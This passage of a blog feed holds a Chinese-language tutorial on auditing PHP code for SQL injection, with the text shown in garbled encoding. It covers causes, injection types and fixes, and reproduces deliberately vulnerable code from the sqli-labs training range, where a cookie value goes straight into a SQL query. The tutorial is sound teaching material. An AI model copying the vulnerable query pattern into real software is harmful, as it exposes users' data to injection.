d7140b4554ab6fb8043fa41e06a024ec1449fb083c75095b1f6e6c8c6438b3cb67c3f1a729b729b4c6f845d3de62a89770a5cb39710b9d5eae43225f073e5c1f0a7dac7c5acbd85b829793d193e6b33b1658f039123192d769c7a15d8a39f1afafa3f476d28b21264e109faf36e8d64b3d924f5ada3da8031dfaeee3d5b97aa53a5891f20f817661241ea677335472ee4ad4e1ffbdac3d5719403c888890c1eb04ac20defa4ceaf3c3b4cb636bdcd8d29992960935657a09bdc14e7eddf4269582056a1db50761dbc2ba2d8bb797200dc1411070e36916c9f408c276701e352114cd1b7a72c64a56f6ff79805fe9962ea1f981769c5b3a305c4ee2f4a831856b4546c7a1d8ed67fd31f14847e6ad0981970818f7ed934271222ee949ad9b75688ed8f616f415ceb2985ad6325</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">è¯·è¾“å…¥æ‚¨è·å–åˆ°çš„å¯†ç </span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">æ­¤æ–‡ç« ç›®å‰éœ€è¦å¯†ç ï¼Œæš‚ä¸å¯¹å¤–å¼€æ”¾å“Ÿã€‚</summary>
    
    
    
    <category term="ç”Ÿæ´»" scheme="https://fz1lin.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="private" scheme="https://fz1lin.com/tags/private/"/>
    
    <category term="Life" scheme="https://fz1lin.com/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>PHPä»£ç å®¡è®¡-SQLæ³¨å…¥åŸºç¡€</title>
    <link href="https://fz1lin.com/2021/3145843663/"/>
    <id>https://fz1lin.com/2021/3145843663/</id>
    <published>2021-12-13T11:23:45.000Z</published>
    <updated>2021-12-13T11:29:56.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-SQLæ³¨å…¥åŸç†"><a href="#0x01-SQLæ³¨å…¥åŸç†" class="headerlink" title="0x01 SQLæ³¨å…¥åŸç†"></a>0x01 SQLæ³¨å…¥åŸç†</h2><h3 id="1-SQL-æ³¨å…¥æ¦‚è¿°"><a href="#1-SQL-æ³¨å…¥æ¦‚è¿°" class="headerlink" title="1.SQL æ³¨å…¥æ¦‚è¿°"></a>1.SQL æ³¨å…¥æ¦‚è¿°</h3><p>SQLæ³¨å…¥çš„äº§ç”Ÿæ˜¯webä»£ç ä¸­å¯æ§çš„å‚æ•°æ²¡æœ‰è¿›è¡Œè¿‡æ»¤æˆ–æ²¡æœ‰è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ï¼Œä¸ç¨‹åºä¸­åŸæœ‰çš„SQLè¯­å¥æ‹¼æ¥ï¼Œè¢«å¸¦å…¥SQLæ¨¡æ¿ä¸­ç¼–è¯‘æ‰§è¡Œï¼Œé€ æˆäº†æ¼æ´ï¼Œæ¼æ´ç‚¹å°±åœ¨ä¸æ•°æ®åº“äº¤äº’çš„åœ°æ–¹ã€‚</p><p>SQLæ³¨å…¥çš„å±å®³ï¼Œå–å†³äºå¯¹ç›®æ ‡çš„é€ æˆçš„å±å®³ç¨‹åº¦</p><ul><li>webshellï¼Œå‘½ä»¤æ‰§è¡Œã€æœåŠ¡å™¨ææƒï¼Œè·å–æ•°æ®åº“æ•°æ®ç­‰</li><li>è·å–æ•°æ®ç‰ˆæœ¬ä¿¡æ¯ï¼Œè´¦å·ç™»å½•ç­‰</li></ul><h3 id="2-SQLæ³¨å…¥çš„æ¡ä»¶"><a href="#2-SQLæ³¨å…¥çš„æ¡ä»¶" class="headerlink" title="2.SQLæ³¨å…¥çš„æ¡ä»¶"></a>2.SQLæ³¨å…¥çš„æ¡ä»¶</h3><ol><li>å¯æ§çš„å‚æ•°</li><li>å‚æ•°æœªè¿‡æ»¤æˆ–è¿‡æ»¤ä¸å®Œæ•´</li><li>å¯æ§çš„å‚æ•°ä¸æ•°æ®åº“æœ‰äº¤äº’</li></ol><h3 id="3-SQLæ³¨å…¥çš„ç±»å‹"><a href="#3-SQLæ³¨å…¥çš„ç±»å‹" class="headerlink" title="3.SQLæ³¨å…¥çš„ç±»å‹"></a>3.SQLæ³¨å…¥çš„ç±»å‹</h3><p>SQLæ³¨å…¥åˆ†ç±»</p><ul><li>æ³¨å…¥çš„å¯æ§å‚æ•°çš„ç±»å‹ï¼Œå¦‚ï¼šæ•°å­—å‹æ³¨å…¥å’Œå­—ç¬¦ä¸²æ³¨å…¥</li><li>æ³¨å…¥çš„äº§ç”Ÿï¼Œå¦‚ï¼šGETæ³¨å…¥ã€POSTæ³¨å…¥ã€cookieæ³¨å…¥ã€Headeræ³¨å…¥ç­‰</li><li>æ”»å‡»çš„æ‰‹æ³•ï¼Œå¦‚ï¼šæ™®é€šæ³¨å…¥ã€ç›²æ³¨ã€æŠ¥é”™æ³¨å…¥ã€å»¶æ—¶æ³¨å…¥ã€å®½å­—èŠ‚æ³¨å…¥ã€äºŒæ¬¡æ³¨å…¥ç­‰</li></ul><h3 id="4-SQLæ³¨å…¥çš„æ¼æ´åœºæ™¯"><a href="#4-SQLæ³¨å…¥çš„æ¼æ´åœºæ™¯" class="headerlink" title="4.SQLæ³¨å…¥çš„æ¼æ´åœºæ™¯"></a>4.SQLæ³¨å…¥çš„æ¼æ´åœºæ™¯</h3><p>GETè¯·æ±‚ï¼šç¨‹åºå¯¹åº”çš„åŠŸèƒ½ï¼Œæœç´¢ï¼Œåˆ—è¡¨ï¼Œè¯¦æƒ…ï¼ŒæŸ¥çœ‹å‚æ•°æœ‰æ²¡æœ‰è¿‡æ»¤æˆ–ä½¿ç”¨é¢„ç¼–è¯‘çš„å ä½ç¬¦è¿›è¡Œå‚æ•°ç»‘å®šã€‚</p><p>POSTè¯·æ±‚ï¼šç¨‹åºå¯¹åº”çš„åŠŸèƒ½ï¼Œæœç´¢ï¼Œæ›´æ–°ï¼ŒæŸ¥è¯¢ï¼Œç™»å½•ï¼Œå¿˜è®°å¯†ç ï¼Œæ‰¾å›å¯†ç ï¼ŒéªŒè¯ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ç­‰åŠŸèƒ½ã€‚</p><p>headerå¤´ï¼šå¦‚cookieæ³¨å…¥ï¼ŒIPä¼ªé€ æ³¨å…¥ï¼ˆXFFï¼‰ï¼Œæ³¨å†Œï¼Œç™»å½•å¤„ä¼šè·å–IPï¼Œåç«¯é‡‡ç”¨ HTTP_CLIENT_IPæˆ–X-FORWARD-FORï¼ˆXFFï¼‰è¿›è¡Œè·å–ï¼Œå¦‚æœæ²¡æœ‰å¯¹å…¶è¿‡æ»¤ï¼Œå°±ä¼šå‡ºç°æ³¨å…¥ã€‚</p><p><code>$_SERVER</code>ï¼šå¦‚æœç›®æ ‡ç¨‹åºä½¿ç”¨ GPC è½¬ä¹‰çš„è¯ï¼Œæ˜¯ä¸ä¼šå¯¹<a href="https://www.php.net/manual/zh/reserved.variables.server.php"><code>$_SERVER</code></a>è½¬ä¹‰çš„ï¼Œå¦‚æœä¸è¿›è¡Œè¿‡æ»¤ä¹Ÿä¼šé€ æˆæ¼æ´ã€‚</p><h3 id="5-å®¡è®¡æ€è·¯"><a href="#5-å®¡è®¡æ€è·¯" class="headerlink" title="5.å®¡è®¡æ€è·¯"></a>5.å®¡è®¡æ€è·¯</h3><p>å¦‚æœæ˜¯ MySQL æ³¨å…¥ï¼Œä¸‹æ‰‹ç‚¹ï¼Œå°±æ˜¯SQLè¯­å¥ï¼Œå¦‚ selectã€updateã€insert intoã€deleteã€alterç­‰ï¼Œå°±æ˜¯å‰ç«¯å†™çš„ä»£ç ä¸åç«¯æ•°æ®åº“å¯èƒ½å­˜åœ¨äº¤äº’çš„åœ°æ–¹ï¼Œéƒ½å¯èƒ½å­˜åœ¨SQLæ³¨å…¥ã€‚</p><h3 id="6-æ¼æ´ä¿®å¤"><a href="#6-æ¼æ´ä¿®å¤" class="headerlink" title="6.æ¼æ´ä¿®å¤"></a>6.æ¼æ´ä¿®å¤</h3><p>å…·ä½“çš„å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡æ¡£ <a href="https://www.cnblogs.com/iAmSoScArEd/p/10651947.html">Webå¸¸è§æ¼æ´æè¿°åŠä¿®å¤å»ºè®®</a></p><p>æ€»ä¹‹ç”¨æˆ·çš„å‚æ•°ä¸å¯ä¿¡åŸåˆ™ï¼Œæ‰€æœ‰ä¸æ•°æ®åº“å¯èƒ½äº¤äº’çš„åœ°æ–¹éƒ½è¦è¿›è¡Œè¿‡æ»¤</p><h2 id="0x02-SQLæ³¨å…¥å®¡è®¡æ¡ˆä¾‹"><a href="#0x02-SQLæ³¨å…¥å®¡è®¡æ¡ˆä¾‹" class="headerlink" title="0x02 SQLæ³¨å…¥å®¡è®¡æ¡ˆä¾‹"></a>0x02 SQLæ³¨å…¥å®¡è®¡æ¡ˆä¾‹</h2><h3 id="1-GETå‹æ³¨å…¥"><a href="#1-GETå‹æ³¨å…¥" class="headerlink" title="1.GETå‹æ³¨å…¥"></a>1.GETå‹æ³¨å…¥</h3><p>è¿™æ˜¯ <a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>çš„é¶åœºçš„ <a href="https://github.com/Audi-1/sqli-labs/tree/master/Less-2">Less-2</a> çš„ä»£ç ç‰‡æ®µ</p><p><img src="/2021/3145843663/image-20211213152517245.png" alt="image-20211213152517245"> </p><p>åˆ†æå¯ä»¥çœ‹å‡ºï¼Œè¯¥ä»£ç ç‰‡æ®µï¼Œä»ä½¿ç”¨GETæ¥å— id å‚æ•°åˆ°å°†<code>$id</code>å‚æ•°å¸¦å…¥SQLè¯­å¥åŠä½¿ç”¨ mysql_query å‘é€ç»™æ•°æ®åº“ä¸€ä¸ªè¯­å¥ï¼Œæœªä½œå‡ºä»»ä½•è¿‡æ»¤æˆ–ä½¿ç”¨é¢„ç¼–è¯‘çš„å ä½ç¬¦è¿›è¡Œå‚æ•°ç»‘å®šã€‚ç”±æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ payloadè¿›è¡ŒSQLæ³¨å…¥ã€‚</p><p>payloadæ„é€ -å› ä¸ºæ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥ä»»æ„æ„é€ ï¼Œæœ€ç»ˆè¾¾åˆ°æŸ¥è¯¢ç›®çš„å³å¯ã€‚</p><h3 id="2-POST-å‹æ³¨å…¥"><a href="#2-POST-å‹æ³¨å…¥" class="headerlink" title="2.POST å‹æ³¨å…¥"></a>2.POST å‹æ³¨å…¥</h3><p>è¿™æ˜¯ <a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>çš„é¶åœºçš„ Less-12çš„ä»£ç ç‰‡æ®µ</p><p><img src="/2021/3145843663/image-20211213180438672.png" alt="image-20211213180438672"> </p><p>åˆ†æä»£ç ï¼š</p><p>å¯ä»¥çœ‹å‡ºä½¿ç”¨<code>$_POST</code>æ¥å—çš„å‚æ•°ï¼Œç›´æ¥å¸¦å…¥äº† SQL è¯­å¥ï¼Œä¹Ÿæ²¡æœ‰è¿‡æ»¤ï¼Œè¿˜æŠ‘åˆ¶äº†æ•°æ®çš„æŠ¥é”™ï¼ˆ@ï¼Œä»»ä½•é”™è¯¯éƒ½ä¼šå¿½ç•¥ï¼‰</p><h3 id="3-cookieæ³¨å…¥"><a href="#3-cookieæ³¨å…¥" class="headerlink" title="3.cookieæ³¨å…¥"></a>3.cookieæ³¨å…¥</h3><p>è¿™æ˜¯ <a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>çš„é¶åœºçš„ Less-20çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;div style=&#x27; margin-top:20px;color:#FFF; font-size:24px; text-align:center&#x27;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&#x27;#FF0000&#x27;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;div  align=&#x27;center&#x27; style=&#x27;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;div style=&#x27;padding-top:10px; font-size:15px;&#x27;&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!--Form to post the contents --&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot; &quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27; &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;   &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;&#x27;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27; &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;   &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;   &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))   <span class="comment">// Quote if not a number</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row1</span> = mysql_fetch_array(<span class="variable">$result1</span>);</span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">setcookie(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$cookee</span>, time()+<span class="number">3600</span>);</span><br><span class="line">header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;I LOVE YOU COOKIES&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &#x27;Your Cookie is: &#x27; .$cookee;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$format</span> = <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line"><span class="variable">$timestamp</span> = time() + <span class="number">3600</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;YOUR USER AGENT IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;YOUR IP ADDRESS IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;YOUR COOKIE : uname = <span class="subst">$cookee</span> and expires: &quot;</span> . date(<span class="variable">$format</span>, <span class="variable">$timestamp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;  </span><br><span 